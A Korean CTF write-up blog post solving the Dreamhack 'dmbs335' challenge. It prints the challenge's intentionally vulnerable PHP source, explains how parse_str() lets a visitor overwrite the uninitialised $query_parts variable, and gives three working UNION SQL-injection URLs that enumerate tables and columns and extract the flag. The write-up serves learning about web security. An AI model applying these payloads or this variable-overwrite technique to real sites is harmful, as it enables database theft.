---
title: (44) Dreamhack [wargame.kr] dmbs335 문제 풀이
date: 2024-03-03 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
```
SQL injection Challenge!
(injection)

- thx to dmbs335
```

## 문제 풀이
사이트에 접속한 모습입니다.
![](https://kyuyeop.github.io/assets/img/post/44/1.png)

바로 코드부터 확인해보겠습니다.
```php
<?php 

if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
}

include("./inc.php"); // Database Connected

function getOperator(&$operator) { 
    switch($operator) { 
        case 'and': 
        case '&&': 
            $operator = 'and'; 
            break; 
        case 'or': 
        case '||': 
            $operator = 'or'; 
            break; 
        default: 
            $operator = 'or'; 
            break; 
}} 

if(preg_match('/session/isUD',$_SERVER['QUERY_STRING'])) {
    exit('not allowed');
}

parse_str($_SERVER['QUERY_STRING']); 
getOperator($operator); 
$keyword = addslashes($keyword);
$where_clause = ''; 

if(!isset($search_cols)) { 
    $search_cols = 'subject|content'; 
} 

$cols = explode('|',$search_cols); 

foreach($cols as $col) { 
    $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : ''; 
    if($col) { 
        $query_parts = $col . " like '%" . $keyword . "%'"; 
    } 

    if($query_parts) { 
        $where_clause .= $query_parts; 
        $where_clause .= ' '; 
        $where_clause .= $operator; 
        $where_clause .= ' '; 
        $query_parts = ''; 
    } 
} 

if(!$where_clause) { 
    $where_clause = "content like '%{$keyword}%'"; 
} 
if(preg_match('/\s'.$operator.'\s$/isDU',$where_clause)) { 
    $len = strlen($where_clause) - (strlen($operator) + 2);
    $where_clause = substr($where_clause, 0, $len); 
} 


?>
<style>
    td:first-child, td:last-child {text-align:center;}
    td {padding:3px; border:1px solid #ddd;}
    thead td {font-weight:bold; text-align:center;}
    tbody tr {cursor:pointer;}
</style>
<br />
<table border=1>
    <thead>
        <tr><td>Num</td><td>subject</td><td>content</td><td>writer</td></tr>
    </thead>
    <tbody>
        <?php
            $result = mysql_query("select * from board where {$where_clause} order by idx desc");
            while ($row = mysql_fetch_assoc($result)) {
                echo "<tr>";
                echo "<td>{$row['idx']}</td>";
                echo "<td>{$row['subject']}</td>";
                echo "<td>{$row['content']}</td>";
                echo "<td>{$row['writer']}</td>";
                echo "</tr>";
            }
        ?>
    </tbody>
    <tfoot>
        <tr><td colspan=4>
            <form method="">
                <select name="search_cols">
                    <option value="subject" selected>subject</option>
                    <option value="content">content</option>
                    <option value="content|content">subject, content</option>
                    <option value="writer">writer</option>
                </select>
                <input type="text" name="keyword" />
                <input type="radio" name="operator" value="or" checked /> or &nbsp;&nbsp;
                <input type="radio" name="operator" value="and" /> and
                <input type="submit" value="SEARCH" />
            </form>
        </td></tr>
    </tfoot>
</table>
<br />
<a href="./?view-source">view-source</a><br />
```
문제는 sqli를 이용해야 하는것 같습니다. sqli가 가능한 곳이 어디인지 확인해봅시다.  
먼저 `search_cols`에 대해서 살펴보면 `|`를 기준으로 나눈 문자열들이 `^(subject|content|writer)$`라는 regex를 만족해야 입력값이 반영될 수 있고, 나머지의 경우 빈 값이 들어가게 되는군요. 여긴 힘들어 보입니다.  
다음은 `keyword`입니다. 이건 `$keyword = addslashes($keyword);`로 따옴표 같은 문자를 역슬래시 처리하기 때문에 불가능하겠고요.  
그리고 `operator`는 `getOperator`함수로 인해 `or` 또는 `and`만 가능하도록 설계되었네요.  
  
그럼 취약점이 없는것 처럼 보입니다.  
하지만 숨겨진게 더 있죠. 바로 `query_parts`라는 변수입니다. 이 변수는 조건을 맞추면 초기화가 되지 않고 쿼리문을 조작할 수 있습니다.  
이 취약점은 쿼리를 가져올 때 `parse_str($_SERVER['QUERY_STRING']);`로 가져오기 때문에 생긴 취약점입니다. 이 함수는 쿼리 스트링으로 부터 변수를 생성해내는 엄청난 녀석입니다.
이 취약점은 굉장히 강력하기 때문에 공식 페이지에도 다음과 같이 써있습니다.
```
Warning
Using this function without the result parameter is highly DISCOURAGED and DEPRECATED as of PHP 7.2. As of PHP 8.0.0, the result parameter is mandatory.

경고문
result 매개변수 없이 이 함수를 사용하는 것은 PHP 7.2에서 매우 권장 및 권장되지 않습니다. PHP 8.0.0에서는 result 매개변수가 필수입니다.
```
그럼 취약점을 활용해 보겠습니다. `query_parts`를 원하는 대로 변경하려면 변수가 초기화되지 않도록 해야 합니다. 이 변수가 초기화 되는 곳은 `if($col)`조건문의 내부이므로 취약점을 사용하기 위해선 변수 `col`이 빈 값이여야 합니다.  
이게 빈 값이 되려면 `col`의 값이 `^(subject|content|writer)$`에 해당하지 않으면 됩니다. 따라서 쿼리에서 빈 값이나 `a`같은 관련 없는 값을 넘기기만 하면 됩니다. 나머지는 `where_clause`에 할당될 때 `#`으로 우회할 수 있기 때문에 상관없습니다.  
  
아마도 다른 테이블 어딘가에 숨겼을 확률이 높으니 어떤 테이블이 있는지 찾아봅시다.
```
http://host3.dreamhack.games:19743/?search_cols=&keyword=&operator=or&query_parts=0%20union%20select%20null,table_name,null,null%20from%20information_schema.tables#
```
이렇게 들어가면 누가봐도 수상한 이름의 테이블이 보입니다.
![](https://kyuyeop.github.io/assets/img/post/44/2.png)

그리고 칼럼명도 알아내야 겠죠?
```
http://host3.dreamhack.games:19743/?search_cols=&keyword=&operator=or&query_parts=0%20union%20select%20null,column_name,null,null%20from%20information_schema.columns#
```
또 누가봐도 수상한 이름의 칼럼이 보이네요.
![](https://kyuyeop.github.io/assets/img/post/44/3.png)

테이블도 칼럼도 알아냈으니 마지막으로 flag를 얻어봅시다.
```
http://host3.dreamhack.games:19743/?search_cols=&keyword=&operator=or&query_parts=0%20union%20select%20null,f1ag,null,null%20from%20Th1s_1s_Flag_tbl#
```
flag를 얻었습니다.
![](https://kyuyeop.github.io/assets/img/post/44/4.png)
{% endraw %}